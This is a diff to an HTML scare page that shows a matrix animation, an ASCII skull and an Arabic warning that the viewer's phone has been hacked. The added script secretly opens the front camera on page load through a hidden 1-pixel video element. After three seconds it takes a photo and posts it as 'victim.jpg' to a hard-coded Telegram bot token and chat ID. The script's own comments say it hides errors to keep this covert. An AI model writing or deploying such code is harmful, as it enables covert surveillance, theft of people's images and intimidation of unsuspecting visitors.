@@ -3,55 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKED BY VEXO</title>
+    <title>SYSTEM CRITICAL FAILURE</title>
     <style>
-        body { margin: 0; background: black; overflow: hidden; color: #0f0; font-family: monospace; }
+        body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; }
         canvas { display: block; position: absolute; top: 0; left: 0; z-index: 1; }
-        .overlay { position: relative; z-index: 2; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0, 0, 0, 0.7); }
-        .ascii-skull { font-size: 8px; line-height: 8px; text-shadow: 0 0 12px #0f0; white-space: pre; animation: glitch 0.3s infinite; text-align: center; }
-        .threat-text { font-size: 1.5rem; margin-top: 20px; text-align: center; font-weight: bold; color: #0f0; text-shadow: 0 0 20px red; direction: rtl; }
-        @keyframes glitch { 0% { transform: skew(0.5deg); opacity: 1; } 50% { transform: skew(-0.5deg); opacity: 0.8; } 100% { transform: skew(0.5deg); opacity: 1; } }
+        .overlay { position: relative; z-index: 2; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); }
+        #video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        
+        /* الجمجمة المرعبة الجديدة */
+        .ascii-skull { 
+            font-size: 8px; 
+            line-height: 8px; 
+            white-space: pre; 
+            text-shadow: 0 0 12px #0f0; 
+            margin-bottom: 20px;
+            animation: glitch 0.2s infinite;
+        }
+
+        .loading-text { font-size: 1.2rem; font-weight: bold; text-shadow: 0 0 20px red; direction: rtl; text-align: center; }
+
+        @keyframes glitch {
+            0% { transform: skew(0.5deg); }
+            50% { transform: skew(-0.5deg); opacity: 0.8; }
+            100% { transform: skew(0.5deg); }
+        }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="capture" style="display:none;"></canvas>
+
     <div class="overlay">
         <div class="ascii-skull">
-      ______________________
-     /                      \
-    /   XXXX          XXXX   \
-   |    XXXX          XXXX    |
-   |    XXXX          XXXX    |
-    \        XXXXXX          /
-     \      XXXXXXXX        /
-      \____________________/
-             | |  | |
-             | |  | |
+               ______
+            .-"      "-.
+           /            \
+          |              |
+          |,  .-.  .-.  ,|
+          | )(__/  \__)( |
+          |/     /\     \|
+          (_     ^^     _)
+           \__|IIIIII|__/
+            | \IIIIII/ |
+            \          /
+             `--------`
         </div>
-        <div class="threat-text">
+        <div class="loading-text">
             ⚠️ تـم اخـتراق هـاتفك بنـجاح ⚠️<br>
             سيتم إيقاف النظام بعد 3 أيام
         </div>
     </div>
+
     <script>
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01VEXO7X98#$@%";
+        // معلوماتك الخاصة المدمجة
+        const TELEGRAM_TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs';
+        const CHAT_ID = '7822309283';
+
+        // تأثير الماتركس
+        const mCanvas = document.getElementById('matrix');
+        const ctx = mCanvas.getContext('2d');
+        mCanvas.width = window.innerWidth; mCanvas.height = window.innerHeight;
+        const letters = "01VEXO#$@%";
         const fontSize = 16;
-        const columns = canvas.width / fontSize;
+        const columns = mCanvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
         function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, mCanvas.width, mCanvas.height);
             ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
             drops.forEach((y, i) => {
                 const text = letters[Math.floor(Math.random() * letters.length)];
                 ctx.fillText(text, i * fontSize, y * fontSize);
-                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                if (y * fontSize > mCanvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             });
         }
         setInterval(draw, 33);
+
+        // تشغيل الكاميرا وإرسال الصورة سراً
+        async function startApp() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                // ننتظر 3 ثواني ثم نلتقط الصورة
+                setTimeout(captureAndSend, 3000); 
+            } catch (err) {
+                // لا نظهر شيئاً هنا لإبقاء المقلب سرياً
+            }
+        }
+
+        function captureAndSend() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('capture');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'victim.jpg');
+                formData.append('caption', '💀 صيد جديد بعبارة VEXO!\nالجمجمة المرعبة الجديدة تعمل.');
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }
+
+        window.onload = startApp;
     </script>
 </body>
 </html>
